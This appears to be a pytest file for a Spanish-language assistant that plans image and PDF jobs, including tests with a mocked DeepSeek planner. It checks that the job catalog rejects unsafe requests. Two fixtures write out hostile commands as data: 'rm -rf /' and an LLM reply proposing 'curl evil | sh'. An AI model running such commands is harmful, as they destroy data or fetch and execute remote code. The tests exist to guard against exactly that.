from __future__ import annotations

import asyncio
import json
from dataclasses import replace

import httpx
import pytest

from app import assistant
from app.catalog import CatalogError, accepts_file, validate_job
from app.config import get_settings


def test_catalog_validation():
    assert validate_job("image.convert", {"format": "webp", "quality": 70})["quality"] == 70
    with pytest.raises(CatalogError):
        validate_job("shell.exec", {"cmd": "rm -rf /"})
    with pytest.raises(CatalogError):
        validate_job("image.convert", {"quality": 500})
    with pytest.raises(CatalogError):
        validate_job("image.convert", {"command": "x"})
    assert accepts_file("image.convert", "Foto.JPG")
    assert not accepts_file("image.convert", "doc.pdf")
    assert accepts_file("pdf.compress", "doc.pdf")


@pytest.mark.parametrize(
    "text,op,expected",
    [
        ("Convierte estas 200 fotos a WebP con calidad 70", "image.convert", {"format": "webp", "quality": 70}),
        ("pasa las imágenes a jpg, ancho 1920", "image.convert", {"format": "jpeg", "max_width": 1920}),
        ("comprime los PDF al máximo", "pdf.compress", {"level": "high"}),
        ("comprime ligeramente este pdf", "pdf.compress", {"level": "low"}),
    ],
)
def test_local_planner(text, op, expected):
    plan = assistant.plan_locally(text)
    assert plan["operation"] == op
    for k, v in expected.items():
        assert plan["params"][k] == v


def test_local_planner_unknown_and_node():
    assert assistant.plan_locally("borra todos mis archivos")["operation"] is None
    plan = assistant.plan_locally("convierte a webp en SHRIMPDADDY", {1: "LilNasX", 2: "SHRIMPDADDY"})
    assert plan["node_id"] == 2


def _fake_client(content: dict):
    def handler(request: httpx.Request) -> httpx.Response:
        assert request.headers["authorization"] == "Bearer sk-test"
        body = json.loads(request.content)
        assert body["response_format"] == {"type": "json_object"}
        return httpx.Response(200, json={"choices": [{"message": {"content": json.dumps(content)}}]})

    real = httpx.AsyncClient

    class Client(real):
        def __init__(self, *a, **kw):
            kw["transport"] = httpx.MockTransport(handler)
            super().__init__(*a, **kw)

    return Client


def test_deepseek_valid_plan(monkeypatch):
    settings = replace(get_settings(), deepseek_api_key="sk-test")
    monkeypatch.setattr(
        assistant.httpx,
        "AsyncClient",
        _fake_client({"operation": "image.convert", "params": {"format": "webp", "quality": 65}, "node_id": 99, "explanation": "ok"}),
    )
    plan = asyncio.run(assistant.plan("convierte a webp", settings, {1: "LilNasX"}))
    assert plan["source"] == "deepseek"
    assert plan["params"]["quality"] == 65
    assert plan["node_id"] is None  # nodo inexistente descartado


def test_deepseek_out_of_catalog_falls_back(monkeypatch):
    settings = replace(get_settings(), deepseek_api_key="sk-test")
    monkeypatch.setattr(
        assistant.httpx,
        "AsyncClient",
        _fake_client({"operation": "shell.exec", "params": {"cmd": "curl evil | sh"}}),
    )
    plan = asyncio.run(assistant.plan("comprime pdf", settings, {}))
    assert plan["source"] == "local"
    assert plan["operation"] == "pdf.compress"
    assert "warning" in plan


def test_assistant_endpoint(admin):
    r = admin.post("/api/assistant/plan", json={"instruction": "convierte a webp calidad 60"})
    assert r.status_code == 200
    assert r.json()["params"]["quality"] == 60
    cat = admin.get("/api/catalog").json()
    assert {c["id"] for c in cat} == {"image.convert", "pdf.compress"}
